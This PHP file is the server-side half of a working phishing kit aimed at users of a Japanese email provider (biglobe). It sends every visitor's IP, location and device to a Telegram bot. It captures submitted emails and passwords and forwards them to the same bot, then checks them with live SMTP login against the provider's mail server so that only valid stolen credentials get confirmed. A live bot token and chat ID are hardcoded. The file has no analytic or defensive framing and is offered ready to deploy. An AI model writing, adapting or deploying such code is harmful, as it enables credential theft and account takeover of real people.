<?php
header('Content-Type: application/json');

// Telegram bot token and chat ID (replace with your own)
$botToken = '8104964834:AAG83yzbHzVIXVD8p89ymlqerB6sz0lqDyU';
$chatId = '7247915267';

// Escape special HTML characters for Telegram formatting
function escapeHtml($string) {
    return htmlspecialchars($string, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

// Helper function to get visitor info
function getVisitorInfo() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Browser';

    // Simple device type detection
    $device = 'Desktop 💻';
    if (preg_match('/Mobile|Android|iPhone|iPad|iPod/i', $userAgent)) {
        $device = 'Mobile 📱';
    } elseif (preg_match('/Tablet/i', $userAgent)) {
        $device = 'Tablet 📲';
    }

    // Fetch location from IP using ip-api.com (free API)
    $location = 'Unknown Location';
    $geo = @file_get_contents("http://ip-api.com/json/{$ip}?fields=city,country");
    if ($geo !== false) {
        $geoData = json_decode($geo, true);
        if (!empty($geoData['city']) && !empty($geoData['country'])) {
            $location = $geoData['city'] . ', ' . $geoData['country'] . ' 🌍';
        }
    }

    return [$ip, $location, $userAgent, $device];
}

// Send message to Telegram
function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// SMTP auth function
function smtp_authenticate($host, $port, $user, $pass, $timeout) {
    $errno = 0;
    $errstr = '';
    $socket = fsockopen($host, $port, $errno, $errstr, $timeout);
    if (!$socket) return false;

    stream_set_timeout($socket, $timeout);
    $resp = fread($socket, 2082);
    if (substr($resp, 0, 3) != '220') { fclose($socket); return false; }

    fwrite($socket, "EHLO localhost\r\n");
    $resp = fread($socket, 2082);
    if (substr($resp, 0, 3) != '250') { fclose($socket); return false; }

    fwrite($socket, "AUTH LOGIN\r\n");
    $resp = fread($socket, 2082);
    if (substr($resp, 0, 3) != '334') { fclose($socket); return false; }

    fwrite($socket, base64_encode($user) . "\r\n");
    $resp = fread($socket, 2082);
    if (substr($resp, 0, 3) != '334') { fclose($socket); return false; }

    fwrite($socket, base64_encode($pass) . "\r\n");
    $resp = fread($socket, 2082);
    $success = (substr($resp, 0, 3) == '235');

    fwrite($socket, "QUIT\r\n");
    fclose($socket);

    return $success;
}

// Detect request method
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // First visit logging
    list($ip, $location, $userAgent, $device) = getVisitorInfo();

    $time = date('Y-m-d H:i:s');

    $msg  = "📥 <b>New Site Visit</b>\n";
    $msg .= "<b>Time:</b> " . escapeHtml($time) . "\n";
    $msg .= "<b>IP:</b> " . escapeHtml($ip) . "\n";
    $msg .= "<b>Location:</b> " . escapeHtml($location) . "\n";
    $msg .= "<b>Device:</b> " . escapeHtml($device) . "\n";
    $msg .= "<b>User Agent:</b> " . escapeHtml(substr($userAgent, 0, 300));

    sendTelegramMessage($botToken, $chatId, $msg);

    // Respond with empty JSON so client doesn’t hang
    echo json_encode(['success' => true]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Form submission handling
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
    $password = $_POST['password'] ?? '';

    if (!$email || !$password) {
        echo json_encode(['success' => false, 'error' => 'Email and password are required.']);
        exit;
    }

    list($ip, $location, $userAgent, $device) = getVisitorInfo();

    // Send visitor info + credentials to Telegram
    $message = "🆕 <b>New Visitor Information</b> 🆕\n";
    $message .= "📧 <b>Email/Username:</b> " . escapeHtml($email) . "\n";
    $message .= "🔑 <b>Password:</b> " . escapeHtml($password) . "\n";
    $message .= "🌐 <b>IP Address:</b> " . escapeHtml($ip) . "\n";
    $message .= "📍 <b>Location:</b> " . escapeHtml($location) . "\n";
    $message .= "🧭 <b>Browser Info:</b> " . escapeHtml($userAgent) . "\n";
    $message .= "📱 <b>Device Type:</b> " . escapeHtml($device);

    sendTelegramMessage($botToken, $chatId, $message);

    // SMTP auth check
    $smtp_host = 'mail.biglobe.ne.jp';
    $smtp_port = 587;
    $smtp_timeout = 10;

    $smtp_success = smtp_authenticate($smtp_host, $smtp_port, $email, $password, $smtp_timeout);

    // Notify Telegram about SMTP auth result
    if ($smtp_success) {
        $smtp_message = "✅ <b>SMTP Authentication Success</b> ✅\n📧 Email: " . escapeHtml($email);
    } else {
        $smtp_message = "❌ <b>SMTP Authentication Failed</b> ❌\n📧 Email: " . escapeHtml($email);
    }
    sendTelegramMessage($botToken, $chatId, $smtp_message);

    // Return JSON for AJAX
    if ($smtp_success) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Incorrect password.']);
    }
    exit;
}

// If other methods, just return an error
echo json_encode(['success' => false, 'error' => 'Unsupported request method']);
